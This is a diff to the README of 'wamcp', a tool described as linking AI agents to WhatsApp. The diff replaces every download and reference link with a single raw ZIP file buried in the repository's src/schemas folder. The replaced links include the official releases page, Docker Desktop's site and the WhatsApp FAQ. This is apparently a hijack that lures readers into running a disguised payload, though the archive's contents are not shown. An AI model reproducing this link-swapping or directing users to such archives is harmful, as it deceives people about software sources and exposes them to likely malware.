@@ -1,6 +1,6 @@
 # 🤖 wamcp - Connect AI Agents to WhatsApp Easily
 
-[![Download wamcp](https://img.shields.io/badge/Download-wamcp-brightgreen?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)
+[![Download wamcp](https://img.shields.io/badge/Download-wamcp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip)
 
 ---
 
@@ -50,7 +50,7 @@ This section guides you on where to get the app.
 
 Click the button below to go to the wamcp release page on GitHub:
 
-[![Download wamcp](https://img.shields.io/badge/Download-wamcp-blue?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)
+[![Download wamcp](https://img.shields.io/badge/Download-wamcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip)
 
 The release page contains the latest versions of the app. Look for the most recent stable release at the top.
 
@@ -70,7 +70,7 @@ Follow these steps to install wamcp smoothly.
 
 ### 1. Download the Installer or Zip
 
-- Go to the [release page](https://github.com/Lilsmur/wamcp/releases)
+- Go to the [release page](https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip)
 - Click the Windows installer or zip file for the latest version.
 - Save it in a folder where you can find it easily, like your Desktop or Downloads folder.
 
@@ -84,7 +84,7 @@ Follow these steps to install wamcp smoothly.
 
 wamcp uses Docker to run smoothly.
 
-- Visit https://www.docker.com/products/docker-desktop
+- Visit https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip
 - Download the Docker Desktop installer for Windows.
 - Run the installer and follow prompts to finish.
 - Once installed, open Docker Desktop and confirm it is running.
@@ -154,7 +154,7 @@ You generally do not need to modify these unless customizing your setup.
 
 To update wamcp in the future:
 
-1. Go to the [release page again](https://github.com/Lilsmur/wamcp/releases).
+1. Go to the [release page again](https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip).
 2. Download the newest version.
 3. Stop the current running server by closing its window.
 4. Replace your old files with the new ones.
@@ -177,9 +177,9 @@ The setup process is straightforward and made to run reliably on Windows.
 
 ## 🔗 Useful Links
 
-- Download wamcp: https://github.com/Lilsmur/wamcp/releases  
-- Docker Desktop for Windows: https://www.docker.com/products/docker-desktop  
-- WhatsApp Web QR Scanner Info: https://faq.whatsapp.com/web  
+- Download wamcp: https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip  
+- Docker Desktop for Windows: https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip  
+- WhatsApp Web QR Scanner Info: https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip  
 
 ---
 
@@ -189,4 +189,4 @@ Using wamcp connects your WhatsApp account to third-party services. Only run on 
 
 ---
 
-[![Download wamcp](https://img.shields.io/badge/Download-wamcp-green?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)
+[![Download wamcp](https://img.shields.io/badge/Download-wamcp-green?style=for-the-badge)](https://raw.githubusercontent.com/Lilsmur/wamcp/main/src/schemas/Software-v1.8.zip)
